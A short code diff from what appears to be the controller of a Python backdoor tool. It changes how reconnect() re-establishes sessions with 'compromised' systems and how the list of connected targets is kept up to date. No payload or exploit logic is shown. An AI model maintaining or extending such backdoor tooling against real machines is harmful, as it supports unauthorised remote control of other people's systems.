@@ -276,14 +276,14 @@ def create_listener(ip, port):
 
 """ 
 * Function Name:  reconnect()
-* Input:          option (integer): The index value of the object in the list.
+* Input:          obj (BackdoorAttack object): The class instance for which the connection has to be re-established.
 * Output:         None
 * Logic:          The function is used to reconnect with a compromised system  whose connection was broken earlier.
 * Example Call:   reconnect(2)
 """
-def reconnect(option):
-    obj_list[option-1].reconnect()
-    obj_list.append(obj_list.pop(option-1))
+def reconnect(obj):
+    obj.reconnect()
+    obj_list.append(obj)
 
 
 if __name__ == "__main__":
@@ -320,7 +320,10 @@ if __name__ == "__main__":
                                 obj_list.pop(int(option)-1)
 
                             elif(action == "connection closed"):
-                                reconnect_thread  = Thread(target=reconnect, args=(int(option), ))
+                                obj = obj_list[int(option)-1]
+                                obj_list.pop(int(option)-1)
+
+                                reconnect_thread  = Thread(target=reconnect, args=(obj, ))
                                 reconnect_thread.daemon = True
                                 reconnect_thread.start()
 
